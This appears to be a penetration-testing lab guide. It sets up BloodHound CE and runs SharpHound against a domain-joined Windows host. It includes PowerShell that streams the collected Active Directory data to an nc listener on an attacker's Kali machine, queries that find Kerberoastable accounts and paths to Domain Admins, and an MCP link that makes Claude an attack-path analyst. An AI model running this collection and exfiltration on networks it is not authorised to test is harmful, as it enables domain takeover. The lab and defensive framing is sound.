# BloodHound CE Setup + Claude AI MCP Integration

Deploy BloodHound Community Edition, collect Active Directory data with SharpHound, and integrate with Claude Desktop via MCP for AI-powered attack path analysis.

## 1. Install BloodHound CE on Kali

### Prerequisites

```bash
sudo apt install -y docker.io docker-compose
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $(whoami)
```

### Deploy

```bash
cd /opt
sudo git clone https://github.com/SpecterOps/BloodHound.git
cd BloodHound/examples/docker-compose
sudo docker compose up -d
```

Wait for all containers to become healthy:

```bash
sudo docker compose ps
```

Retrieve the initial admin password:

```bash
sudo docker compose logs | grep "Initial Password"
```

Access the UI at `http://localhost:8080`. Log in with `admin` and the initial password. Change it on first login.

### Restart After Reboot

```bash
cd /opt/BloodHound/examples/docker-compose
sudo docker compose up -d
```

## 2. Collect Data with SharpHound

### Download SharpHound

The safest way to get a compatible version is directly from your BloodHound CE instance:

1. Log in to `http://localhost:8080`
2. Click the gear icon -> **Settings** -> **Download Collectors**
3. Click **Download SharpHound**

### Transfer to Target

Serve the zip from Kali:
```bash
cd ~/Downloads
python3 -m http.server 9090
```

Download on the domain-joined Windows target:
```powershell
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "http://<KALI_IP>:9090/sharphound-<version>.zip" -OutFile "C:\Tools\SharpHound.zip"
Expand-Archive -Path "C:\Tools\SharpHound.zip" -DestinationPath "C:\Tools\SharpHound" -Force
```

### Run Collection

Run as any domain user:
```powershell
cd C:\Tools\SharpHound
.\SharpHound.exe -c All
```

Output is a zip file in the same directory.

### Transfer Results to Kali

On Kali:
```bash
nc -lvnp 4444 > bloodhound-data.zip
```

On the Windows target:
```powershell
$file = Get-ChildItem "C:\Tools\SharpHound\*BloodHound*.zip" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
$client = New-Object System.Net.Sockets.TcpClient("<KALI_IP>", 4444)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes($file.FullName)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

### Upload to BloodHound

1. Open `http://localhost:8080` in the browser
2. Click the upload icon
3. Drag and drop the zip file
4. Verify ingestion via **File Ingest History**

### Useful Cypher Queries

Find all Kerberoastable users:
```
MATCH (u:User) WHERE u.hasspn=true RETURN u.name, u.serviceprincipalnames
```

Shortest path from a user to Domain Admins:
```
MATCH p=shortestPath((u:User {name:"H.USER@YOURLAB.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@YOURLAB.LOCAL"})) RETURN p
```

Count all objects:
```
MATCH (n) RETURN labels(n), count(n)
```

## 3. Claude AI MCP Integration

Connect BloodHound to Claude Desktop via the Model Context Protocol for natural language AD attack path analysis.

### Install uv

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc
```

### Clone the MCP Server

```bash
cd /opt
sudo git clone https://github.com/mwnickerson/bloodhound_mcp.git
sudo chown -R $(whoami):$(whoami) bloodhound_mcp
cd bloodhound_mcp
uv sync
```

### Create BloodHound API Token

1. Open `http://localhost:8080` -> gear icon -> **Administration**
2. **Create User** with Administrator role
3. Click the three-dot menu -> **Manage API Tokens** -> **Generate Token**
4. Save the **Token ID** and **Token Key** (key is shown only once)

### Configure Environment

```bash
cat > /opt/bloodhound_mcp/.env << 'EOF'
BLOODHOUND_SCHEME=http
BLOODHOUND_DOMAIN=localhost
BLOODHOUND_PORT=8080
BLOODHOUND_TOKEN_ID=<YOUR_TOKEN_ID>
BLOODHOUND_TOKEN_KEY=<YOUR_TOKEN_KEY>
EOF
```

### Test Connection

```bash
cd /opt/bloodhound_mcp
uv run main.py
```

You should see:
```
Successfully connected to Bloodhound API. Version: ...
```

### Install Claude Desktop on Kali

```bash
curl -fsSL https://aaddrick.github.io/claude-desktop-debian/KEY.gpg | sudo gpg --dearmor -o /usr/share/keyrings/claude-desktop.gpg
echo "deb [signed-by=/usr/share/keyrings/claude-desktop.gpg arch=amd64] https://aaddrick.github.io/claude-desktop-debian stable main" | sudo tee /etc/apt/sources.list.d/claude-desktop.list
sudo apt update
sudo apt install -y claude-desktop
```

### Configure MCP

```bash
mkdir -p ~/.config/Claude
cat > ~/.config/Claude/claude_desktop_config.json << EOF
{
  "mcpServers": {
    "bloodhound_mcp": {
      "command": "$HOME/.local/bin/uv",
      "args": [
        "--directory",
        "/opt/bloodhound_mcp",
        "run",
        "main.py"
      ]
    }
  }
}
EOF
```

### Launch

```bash
claude-desktop
```

Verify the MCP connector is active, then try queries like:

- "List all Kerberoastable users in my BloodHound data"
- "Find the shortest attack path from any domain user to Domain Admins"
- "Analyze all privilege escalation paths and rank by severity"
- "Map the attack chain from svc_automate to Domain Admin and explain each hop"

## Example Output

With 85 users and 12 Kerberoastable accounts, Claude can identify multi-hop attack chains such as:

```
Kerberoast svc_automate (weak password)
  -> GenericAll on IT OU
    -> Reset sysadmin password
      -> Domain Admin via group membership
```

This enables automated attack path discovery and prioritized remediation recommendations directly from the BloodHound graph database.
